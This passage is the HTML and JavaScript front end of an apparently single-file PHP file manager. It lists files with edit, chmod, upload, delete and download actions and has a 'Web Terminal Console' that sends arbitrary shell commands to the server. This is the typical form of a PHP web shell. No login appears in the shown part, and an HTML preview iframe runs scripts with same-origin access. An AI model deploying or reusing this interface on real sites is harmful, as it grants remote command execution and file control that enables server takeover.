                                <a href="?dir=<?php echo urlencode($folder['path']); ?>" class="item-name">
                                    <svg class="item-icon folder" viewBox="0 0 24 24"><path d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.89 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.11-.89-2-2-2h-8l-2-2z"/></svg>
                                    <span class="file-title"><?php echo htmlspecialchars($folder['name']); ?></span>
                                </a>
                            </td>
                            <td><?php echo $folder['size']; ?></td>
                            <td>
                                <span style="cursor:pointer;" onclick="openChmodModal('<?php echo addslashes(htmlspecialchars($folder['path'])); ?>', '<?php echo $folder['perms']; ?>')">
                                    <?php echo $folder['perms']; ?>
                                </span>
                            </td>
                            <td><?php echo $folder['mtime']; ?></td>
                            <td style="text-align: right;">
                                <div class="table-actions" style="justify-content: flex-end;">
                                    <button class="action-icon-btn" title="Rename" onclick="openRenameModal('<?php echo addslashes(htmlspecialchars($folder['path'])); ?>', '<?php echo addslashes(htmlspecialchars($folder['name'])); ?>')">
                                        <svg viewBox="0 0 24 24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>
                                    </button>
                                    <button class="action-icon-btn" title="Properties" onclick="openPropertiesModal('<?php echo addslashes(htmlspecialchars($folder['name'])); ?>', '<?php echo addslashes(htmlspecialchars($folder['path'])); ?>', '<?php echo $folder['size']; ?>', '<?php echo $folder['perms']; ?>', '<?php echo $folder['mtime']; ?>', 'directory')">
                                        <svg viewBox="0 0 24 24"><path d="M11 17h2v-6h-2v6zm1-15C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm0-14c-.55 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"/></svg>
                                    </button>
                                    <form method="POST" style="display:inline;" onsubmit="return confirm('Are you sure you want to delete this folder?');">
                                        <input type="hidden" name="action" value="delete">
                                        <input type="hidden" name="target_path" value="<?php echo htmlspecialchars($folder['path']); ?>">
                                        <button type="submit" class="action-icon-btn danger" title="Delete">
                                            <svg viewBox="0 0 24 24"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg>
                                        </button>
                                    </form>
                                </div>
                            </td>
                        </tr>
                    <?php endforeach; ?>

                    <!-- Files Second -->
                    <?php foreach ($files as $file): ?>
                        <tr class="file-row">
                            <td>
                                <div class="item-name">
                                    <svg class="item-icon file" viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/></svg>
                                    <span class="file-title"><?php echo htmlspecialchars($file['name']); ?></span>
                                </div>
                            </td>
                            <td><?php echo $file['size']; ?></td>
                            <td>
                                <span style="cursor:pointer;" onclick="openChmodModal('<?php echo addslashes(htmlspecialchars($file['path'])); ?>', '<?php echo $file['perms']; ?>')">
                                    <?php echo $file['perms']; ?>
                                </span>
                            </td>
                            <td><?php echo $file['mtime']; ?></td>
                            <td style="text-align: right;">
                                <div class="table-actions" style="justify-content: flex-end;">
                                    <?php if (in_array($file['ext'], ['png', 'jpg', 'jpeg', 'gif', 'webp', 'svg'])): ?>
                                        <button class="action-icon-btn" title="Preview Image" onclick="openImagePreview('<?php echo htmlspecialchars($file['name']); ?>', '<?php echo 'data:' . $file['mime'] . ';base64,' . base64_encode(@file_get_contents($file['path'])); ?>')">
                                            <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                                        </button>
                                    <?php elseif (in_array($file['ext'], ['html', 'htm'])): ?>
                                        <button class="action-icon-btn" title="Preview HTML" onclick="openHtmlPreview('<?php echo htmlspecialchars($file['name']); ?>', '<?php echo addslashes(htmlspecialchars($file['path'])); ?>')">
                                            <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                                        </button>
                                    <?php endif; ?>

                                    <button class="action-icon-btn" title="Edit File" onclick="openEditorModal('<?php echo addslashes(htmlspecialchars($file['name'])); ?>', '<?php echo addslashes(htmlspecialchars($file['path'])); ?>')">
                                        <svg viewBox="0 0 24 24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>
                                    </button>

                                    <a href="?action=download&file=<?php echo urlencode($file['path']); ?>" class="action-icon-btn" title="Download">
                                        <svg viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
                                    </a>

                                    <button class="action-icon-btn" title="Properties" onclick="openPropertiesModal('<?php echo addslashes(htmlspecialchars($file['name'])); ?>', '<?php echo addslashes(htmlspecialchars($file['path'])); ?>', '<?php echo $file['size']; ?>', '<?php echo $file['perms']; ?>', '<?php echo $file['mtime']; ?>', '<?php echo $file['mime']; ?>')">
                                        <svg viewBox="0 0 24 24"><path d="M11 17h2v-6h-2v6zm1-15C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm0-14c-.55 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"/></svg>
                                    </button>

                                    <form method="POST" style="display:inline;" onsubmit="return confirm('Are you sure you want to delete this file?');">
                                        <input type="hidden" name="action" value="delete">
                                        <input type="hidden" name="target_path" value="<?php echo htmlspecialchars($file['path']); ?>">
                                        <button type="submit" class="action-icon-btn danger" title="Delete">
                                            <svg viewBox="0 0 24 24"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg>
                                        </button>
                                    </form>
                                </div>
                            </td>
                        </tr>
                    <?php endforeach; ?>

                    <?php if (empty($folders) && empty($files)): ?>
                        <tr>
                            <td colspan="5" style="text-align: center; color: var(--text-muted); padding: 30px;">Directory is empty.</td>
                        </tr>
                    <?php endif; ?>
                </tbody>
            </table>
        </div>

    </div>

    <!-- Upload Modal -->
    <div class="modal-overlay" id="uploadModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Upload Files</h3>
                <button class="modal-close" onclick="closeModal('uploadModal')">✕</button>
            </div>
            <form method="POST" enctype="multipart/form-data">
                <input type="hidden" name="action" value="upload">
                <input type="hidden" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>">
                <div class="modal-body">
                    <div class="form-group">
                        <label>Select Files (Multiple Allowed)</label>
                        <input type="file" name="upload_files[]" class="input-control" multiple required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn-action" onclick="closeModal('uploadModal')">Cancel</button>
                    <button type="submit" class="btn-action btn-primary">Upload Now</button>
                </div>
            </form>
        </div>
    </div>

    <!-- New Folder Modal -->
    <div class="modal-overlay" id="newFolderModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Create New Folder</h3>
                <button class="modal-close" onclick="closeModal('newFolderModal')">✕</button>
            </div>
            <form method="POST">
                <input type="hidden" name="action" value="new_folder">
                <input type="hidden" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>">
                <div class="modal-body">
                    <div class="form-group">
                        <label>Folder Name</label>
                        <input type="text" name="folder_name" class="input-control" placeholder="my_new_folder" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn-action" onclick="closeModal('newFolderModal')">Cancel</button>
                    <button type="submit" class="btn-action btn-primary">Create Folder</button>
                </div>
            </form>
        </div>
    </div>

    <!-- New File Modal -->
    <div class="modal-overlay" id="newFileModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Create New File</h3>
                <button class="modal-close" onclick="closeModal('newFileModal')">✕</button>
            </div>
            <form method="POST">
                <input type="hidden" name="action" value="new_file">
                <input type="hidden" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>">
                <div class="modal-body">
                    <div class="form-group">
                        <label>File Name</label>
                        <input type="text" name="file_name" class="input-control" placeholder="index.php" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn-action" onclick="closeModal('newFileModal')">Cancel</button>
                    <button type="submit" class="btn-action btn-primary">Create File</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Rename Modal -->
    <div class="modal-overlay" id="renameModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Rename Item</h3>
                <button class="modal-close" onclick="closeModal('renameModal')">✕</button>
            </div>
            <form method="POST">
                <input type="hidden" name="action" value="rename">
                <input type="hidden" name="old_path" id="renameOldPath">
                <input type="hidden" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>">
                <div class="modal-body">
                    <div class="form-group">
                        <label>New Name</label>
                        <input type="text" name="new_name" id="renameNewName" class="input-control" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn-action" onclick="closeModal('renameModal')">Cancel</button>
                    <button type="submit" class="btn-action btn-primary">Save Rename</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Chmod Modal -->
    <div class="modal-overlay" id="chmodModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Change Permissions (chmod)</h3>
                <button class="modal-close" onclick="closeModal('chmodModal')">✕</button>
            </div>
            <form method="POST">
                <input type="hidden" name="action" value="chmod">
                <input type="hidden" name="target_path" id="chmodTargetPath">
                <input type="hidden" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>">
                <div class="modal-body">
                    <div class="form-group">
                        <label>Octal Permissions (e.g., 0755, 0644)</label>
                        <input type="text" name="chmod_mode" id="chmodModeInput" class="input-control" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn-action" onclick="closeModal('chmodModal')">Cancel</button>
                    <button type="submit" class="btn-action btn-primary">Update Permissions</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Properties Modal -->
    <div class="modal-overlay" id="propertiesModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Item Properties</h3>
                <button class="modal-close" onclick="closeModal('propertiesModal')">✕</button>
            </div>
            <div class="modal-body" style="font-size: 14px; line-height: 1.8;">
                <div><strong>Name:</strong> <span id="propName"></span></div>
                <div><strong>Location:</strong> <span id="propPath" style="word-break: break-all;"></span></div>
                <div><strong>Size:</strong> <span id="propSize"></span></div>
                <div><strong>Permissions:</strong> <span id="propPerms"></span></div>
                <div><strong>Last Modified:</strong> <span id="propMtime"></span></div>
                <div><strong>MIME Type:</strong> <span id="propMime"></span></div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn-action" onclick="closeModal('propertiesModal')">Close</button>
            </div>
        </div>
    </div>

    <!-- Fullscreen Code Editor Modal -->
    <div class="modal-overlay" id="editorModal">
        <div class="modal-content fullscreen">
            <div class="modal-header">
                <h3 id="editorTitle">Editing File</h3>
                <button class="modal-close" onclick="closeModal('editorModal')">✕</button>
            </div>
            <form method="POST" style="flex:1; display:flex; flex-direction:column;">
                <input type="hidden" name="action" value="save_file">
                <input type="hidden" name="file_path" id="editorFilePath">
                <input type="hidden" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>">
                <div class="modal-body" style="flex:1; margin-bottom:14px;">
                    <textarea name="file_content" id="editorTextarea" class="code-textarea"></textarea>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn-action" onclick="closeModal('editorModal')">Cancel</button>
                    <button type="submit" class="btn-action btn-primary">Save File</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Image Preview Modal -->
    <div class="modal-overlay" id="imagePreviewModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 id="imagePreviewTitle">Image Preview</h3>
                <button class="modal-close" onclick="closeModal('imagePreviewModal')">✕</button>
            </div>
            <div class="modal-body" style="text-align: center;">
                <img id="imagePreviewSrc" src="" class="preview-img" alt="Preview">
            </div>
            <div class="modal-footer">
                <button type="button" class="btn-action" onclick="closeModal('imagePreviewModal')">Close</button>
            </div>
        </div>
    </div>

    <!-- HTML Preview Modal -->
    <div class="modal-overlay" id="htmlPreviewModal">
        <div class="modal-content fullscreen">
            <div class="modal-header">
                <h3 id="htmlPreviewTitle">HTML Preview</h3>
                <button class="modal-close" onclick="closeModal('htmlPreviewModal')">✕</button>
            </div>
            <div class="modal-body" style="flex: 1;">
                <iframe id="htmlPreviewFrame" class="preview-iframe" sandbox="allow-same-origin allow-scripts"></iframe>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn-action" onclick="closeModal('htmlPreviewModal')">Close</button>
            </div>
        </div>
    </div>

    <!-- Terminal Console Modal -->
    <div class="modal-overlay" id="terminalModal">
        <div class="modal-content fullscreen">
            <div class="modal-header">
                <h3 style="display:flex; align-items:center; gap:8px;">
                    <svg style="width:20px; height:20px; fill:var(--accent);" viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V8h16v10zm-14-9l4 4-4 4 1.41 1.41L12.83 13l-5.42-5.41L6 9zm6 7h6v2h-6v-2z"/></svg>
                    Web Terminal Console
                </h3>
                <button class="modal-close" onclick="closeModal('terminalModal')">✕</button>
            </div>
            <div class="modal-body" style="flex:1; display:flex; flex-direction:column; background:#090d16; border:1px solid var(--border-color); border-radius:8px; padding:16px; font-family:'Fira Code','Consolas',monospace; font-size:13px; line-height:1.6; overflow:hidden;">
                <div id="terminalOutput" style="flex:1; overflow-y:auto; color:#f8fafc; white-space:pre-wrap; word-break:break-all; margin-bottom:12px;">Welcome to Web Terminal Console!
Type any command (e.g. ls -la, pwd, whoami, php -v) and press Enter.
                </div>
                <div style="display:flex; align-items:center; gap:10px; border-top:1px solid var(--border-color); padding-top:10px; flex-wrap:wrap;">
                    <span id="terminalPromptDir" style="color:var(--accent); font-weight:bold; font-size:12px; word-break:break-all;"></span>
                    <span style="color:var(--accent); font-weight:bold;">$</span>
                    <input type="text" id="terminalInput" class="input-control" style="flex:1; background:transparent; border:none; color:#f8fafc; font-family:monospace; font-size:14px; outline:none; min-width:200px;" placeholder="Enter shell command..." autofocus onkeydown="handleTerminalKey(event)">
                    <button class="btn-action btn-primary" onclick="runTerminalCommand()">Execute</button>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn-action" onclick="clearTerminal()">Clear Console</button>
                <button type="button" class="btn-action" onclick="closeModal('terminalModal')">Close</button>
            </div>
        </div>
    </div>

    <!-- Inline JavaScript Handlers -->
    <script>
        var terminalHistory = [];
        var historyIndex = -1;
        var currentTerminalCwd = <?php echo json_encode($current_dir); ?>;

        function openModal(id) {
            document.getElementById(id).classList.add('active');
        }

        function closeModal(id) {
            document.getElementById(id).classList.remove('active');
        }

        function openTerminalModal() {
            openModal('terminalModal');
            document.getElementById('terminalPromptDir').innerText = currentTerminalCwd;
            document.getElementById('terminalInput').focus();
        }

        function clearTerminal() {
            document.getElementById('terminalOutput').innerHTML = 'Console cleared.\n';
        }

        function handleTerminalKey(event) {
            if (event.key === 'Enter') {
                runTerminalCommand();
            } else if (event.key === 'ArrowUp') {
                if (historyIndex > 0) {
                    historyIndex--;
                    document.getElementById('terminalInput').value = terminalHistory[historyIndex] || '';
                }
            } else if (event.key === 'ArrowDown') {
                if (historyIndex < terminalHistory.length - 1) {
                    historyIndex++;
                    document.getElementById('terminalInput').value = terminalHistory[historyIndex] || '';
                } else {
                    historyIndex = terminalHistory.length;
                    document.getElementById('terminalInput').value = '';
                }
            }
        }

        function runTerminalCommand() {
            var input = document.getElementById('terminalInput');
            var cmd = input.value.trim();
            if (!cmd) return;

            var output = document.getElementById('terminalOutput');
            output.innerHTML += '\n<span style="color:#38bdf8;">[' + escapeHtml(currentTerminalCwd) + ']$ ' + escapeHtml(cmd) + '</span>\n';

            terminalHistory.push(cmd);
            historyIndex = terminalHistory.length;
            input.value = '';

            var formData = new FormData();
            formData.append('action', 'exec_cmd');
            formData.append('command', cmd);
            formData.append('dir', currentTerminalCwd);

            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.cwd) {
                    currentTerminalCwd = data.cwd;
                    document.getElementById('terminalPromptDir').innerText = currentTerminalCwd;
                }
                output.innerHTML += escapeHtml(data.output) + '\n';
                output.scrollTop = output.scrollHeight;
            })
            .catch(err => {
                output.innerHTML += '<span style="color:#ef4444;">Error executing command.</span>\n';
                output.scrollTop = output.scrollHeight;
            });
        }

        function escapeHtml(text) {
            var div = document.createElement('div');
            div.innerText = text;
            return div.innerHTML;
        }

        function filterTable() {
            var input = document.getElementById("searchInput");
            var filter = input.value.toLowerCase();
            var rows = document.querySelectorAll("#fileTable tbody tr.file-row");

            rows.forEach(function(row) {
                var title = row.querySelector(".file-title");
                if (title) {
                    var text = title.textContent || title.innerText;
                    if (text.toLowerCase().indexOf(filter) > -1) {
                        row.style.display = "";
                    } else {
                        row.style.display = "none";
                    }
                }
            });
        }

        function openRenameModal(path, currentName) {
            document.getElementById('renameOldPath').value = path;
            document.getElementById('renameNewName').value = currentName;
            openModal('renameModal');
        }

        function openChmodModal(path, currentMode) {
            document.getElementById('chmodTargetPath').value = path;
            document.getElementById('chmodModeInput').value = currentMode;
            openModal('chmodModal');
        }

        function openPropertiesModal(name, path, size, perms, mtime, mime) {
            document.getElementById('propName').innerText = name;
            document.getElementById('propPath').innerText = path;
            document.getElementById('propSize').innerText = size;
            document.getElementById('propPerms').innerText = perms;
            document.getElementById('propMtime').innerText = mtime;
            document.getElementById('propMime').innerText = mime;
            openModal('propertiesModal');
        }

        function openEditorModal(name, path) {
            document.getElementById('editorTitle').innerText = 'Editing: ' + name;
            document.getElementById('editorFilePath').value = path;
            var textarea = document.getElementById('editorTextarea');
            textarea.value = 'Loading contents...';
            openModal('editorModal');

            fetch('?action=get_content&file=' + encodeURIComponent(path))
                .then(response => response.text())
                .then(data => {
                    textarea.value = data;
                })
                .catch(err => {
                    textarea.value = 'Failed to load file contents.';
                });
        }

        function openImagePreview(name, dataUri) {
            document.getElementById('imagePreviewTitle').innerText = 'Preview: ' + name;
            document.getElementById('imagePreviewSrc').src = dataUri;
            openModal('imagePreviewModal');
        }

        function openHtmlPreview(name, path) {
            document.getElementById('htmlPreviewTitle').innerText = 'HTML Preview: ' + name;
            var iframe = document.getElementById('htmlPreviewFrame');
            iframe.src = '?action=get_content&file=' + encodeURIComponent(path);
            openModal('htmlPreviewModal');
        }
    </script>
</body>
</html>
